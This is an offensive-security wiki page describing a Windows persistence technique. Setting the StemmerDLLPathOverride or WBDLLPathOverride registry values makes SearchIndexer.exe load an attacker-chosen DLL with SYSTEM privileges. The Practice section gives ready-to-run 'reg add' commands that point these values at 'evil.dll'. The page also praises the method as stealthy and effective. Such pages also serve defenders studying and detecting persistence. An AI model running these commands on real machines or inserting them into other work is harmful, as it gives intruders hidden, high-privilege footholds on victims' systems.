# Natural Language 6 DLLs Persistence

## Theory

The **Natural Language Development Platform 6 (NaturalLanguage6.dll) Persistence** technique leverages registry keys associated with the **Natural Language Development Platform 6 library** to achieve code execution by loading a malicious DLL.

By modifying the registry values **`StemmerDLLPathOverride`** or **`WBDLLPathOverride`** under the relevant keys, an attacker can specify the path to a custom DLL. When **`SearchIndexer.exe`**, a built-in Windows service responsible for indexing files, initializes, it calls **`LoadLibrary`** to load the DLL specified in these registry values.

#### **Trigger Condition:**

This persistence mechanism is triggered whenever **`SearchIndexer.exe`** starts or restarts, which typically occurs:

* At system startup
* When the Windows Search service (`WSearch`) is restarted
* Periodically, depending on system activity and indexing behavior

Since **`SearchIndexer.exe`** runs with SYSTEM privileges, this technique can provide high-privileged code execution, making it a stealthy and effective persistence method.

## Practice

{% tabs %}
{% tab title="Natural Language 6 DLLs" %}
You can force SearchIndexer.exe to load some DLLs specified in this registry:

* `HKLM\System\CurrentControlSet\Control\ContentIndex\Language\<some language>\StemmerDLLPathOverride`
* `HKLM\System\CurrentControlSet\Control\ContentIndex\Language\<some language>\WBDLLPathOverride`

```powershell
# StemmerDLLPathOverride
reg add "HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_US" /v StemmerDLLPathOverride /t REG_SZ /d "C:\Users\root\evil.dll"

# WBDLLPathOverride
reg add "HKLM\System\CurrentControlSet\Control\ContentIndex\Language\English_US" /v WBDLLPathOverride /t REG_SZ /d "C:\Users\root\evil.dll"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/" %}

{% embed url="https://persistence-info.github.io/Data/naturallanguage6.html" %}
